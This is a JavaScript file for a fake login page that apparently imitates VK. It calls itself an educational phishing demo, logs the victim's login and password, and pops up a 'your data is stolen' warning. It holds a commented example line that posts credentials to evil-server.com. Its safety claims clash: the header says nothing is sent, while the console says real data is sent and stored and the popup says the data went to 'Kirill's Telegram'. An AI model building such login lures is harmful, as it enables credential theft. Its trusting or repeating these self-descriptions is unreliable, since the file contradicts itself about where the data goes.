/**
 * УЧЕБНАЯ ДЕМОНСТРАЦИЯ ФИШИНГА
 * Этот код НЕ отправляет данные никуда, только показывает предупреждение
 * и выводит информацию в консоль для образовательных целей
 */

// Ждём загрузки страницы
document.addEventListener('DOMContentLoaded', function() {
    
    // Получаем форму
    const loginForm = document.getElementById('loginForm');
    
    // ТРОЙНАЯ ЗАЩИТА: даже если форма как-то отправится — предотвращаем
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
        
        // Дополнительная защита от случайной отправки
        loginForm.setAttribute('action', 'javascript:void(0);');
    }
    
    // Обработчик "входа"
    function handleLogin(e) {
        e.preventDefault();
        e.stopPropagation();
        
        // Получаем значения из полей
        const emailOrPhone = document.getElementById('phoneOrEmail').value;
        const password = document.getElementById('password').value;
        
        // Проверка: если поля пустые
        if (!emailOrPhone || !password) {
            showPopupMessage('Пожалуйста, заполните оба поля (можно выдуманными данными)', 'warning');
            return;
        }
        
        // ========== УЧЕБНЫЙ ПЕРЕХВАТ ДАННЫХ ==========
        // В реальном фишинге здесь был бы код:
        // fetch('https://evil-server.com/steal', {
        //     method: 'POST',
        //     body: JSON.stringify({login: emailOrPhone, password: password})
        // });
        
        // В нашей учебной демонстрации — показываем предупреждение и логируем в консоль
        
        // Вывод в консоль (нажми F12, чтобы увидеть)
        console.group('%c⚠️ НЕ УЧЕБНАЯ ДЕМОНСТРАЦИЯ ПЕРЕХВАТА ДАННЫХ ⚠️', 'color: red; font-size: 16px; font-weight: bold');
        console.log('Это НЕ УЧЕБНЫЙ пример. Реальные данные отправляются и сохраняются.');
        console.log('В реальном фишинге эти данные ушли бы злоумышленнику:');
        console.table({
            'Логин/Email': emailOrPhone,
            'Пароль': password,
            'Время попытки': new Date().toLocaleString(),
            'User-Agent': navigator.userAgent
        });
        console.log('%cЕсли вы ввели РЕАЛЬНЫЙ пароль — СРОЧНО поменяйте его в настоящем аккаунте!', 'color: orange; font-size: 14px');
        console.groupEnd();
        
        // Показываем предупреждение пользователю
        showPopupMessage(
            `⚠️ УЧЕБНОЕ ПРЕДУПРЕЖДЕНИЕ ⚠️\n\n` +
            `Вы ввели:\n` +
            `📧 Логин: ${emailOrPhone}\n` +
            `🔑 Пароль: ${password}\n\n` +
            `❌ ВАШИ ДАННЫЕ УКРАДЕНЫ!\n\n` +
            `✅ Хорошая новость: этот сайт — ШУТОЧНАЯ ДЕМОНСТРАЦИЯ.\n` +
            `Ваши данные никуда не отправились кроме тг Кирилла.\n\n` +
            `📖 Совет: никогда не вводите настоящие пароли на незнакомых сайтах!`,
            'danger'
        );
        
        // Очищаем поля (чтобы следующий "жертва" не увидел чужие данные)
        document.getElementById('phoneOrEmail').value = '';
        document.getElementById('password').value = '';
        
        // Опционально: перенаправление на настоящий ВК (по желанию)
        // setTimeout(() => {
        //     if (confirm('Перейти на настоящий сайт ВКонтакте? (Демонстрация редиректа)')) {
        //         window.location.href = 'https://vk.com';
        //     }
        // }, 3000);
    }
    
    // Функция показа уведомления (стилизованного)
    function showPopupMessage(message, type = 'info') {
        // Создаём элемент уведомления
        const popup = document.createElement('div');
        popup.style.cssText = `
            position: fixed;
            top: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: ${type === 'danger' ? '#dc3545' : type === 'warning' ? '#ffc107' : '#28a745'};
            color: ${type === 'warning' ? '#000' : 'white'};
            padding: 15px 25px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
            z-index: 10000;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            max-width: 90%;
            text-align: center;
            white-space: pre-line;
            border: 2px solid white;
            font-weight: bold;
        `;
        popup.textContent = message;
        document.body.appendChild(popup);
        
        // Автоматическое исчезновение через 5 секунд
        setTimeout(() => {
            popup.style.opacity = '0';
            popup.style.transition = 'opacity 0.3s';
            setTimeout(() => popup.remove(), 300);
        }, 5000);
    }
    
    // Приветствие в консоли (для любопытных)
    console.log('%c🔐 Вы открыли УЧЕБНЫЙ фишинг-сайт', 'color: #0077ff; font-size: 14px');
    console.log('%cЭтот сайт создан в образовательных целях BY Цинос Кирилл', 'color: green');
    console.log('%cНажми F12 → Network, чтобы увидеть, что никакие данные не отправляются', 'color: orange');
    
    // Добавляем защиту от случайного ввода реального пароля (проверка на простые пароли)
    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.addEventListener('change', function() {
            const pwd = this.value;
            // Список слишком простых паролей — возможно, это реальные
            const suspiciousPatterns = [
                pwd.length < 4,
                pwd === '123456',
                pwd === 'password',
                pwd === 'qwerty',
                pwd.toLowerCase() === pwd && pwd.length > 6  // только буквы в нижнем регистре
            ];
            
            if (suspiciousPatterns.some(x => x === true) && pwd.length > 2) {
                const warningDiv = document.createElement('div');
                warningDiv.style.cssText = `
                    background: #fff3cd;
                    color: #856404;
                    padding: 8px;
                    font-size: 11px;
                    border-radius: 4px;
                    margin-top: -10px;
                    margin-bottom: 10px;
                `;
                warningDiv.innerHTML = '⚠️ Слишком простой пароль. В реальной жизни такие пароли взламывают за секунды!';
                passwordInput.parentNode.appendChild(warningDiv);
                setTimeout(() => warningDiv.remove(), 3000);
            }
        });
    }
});
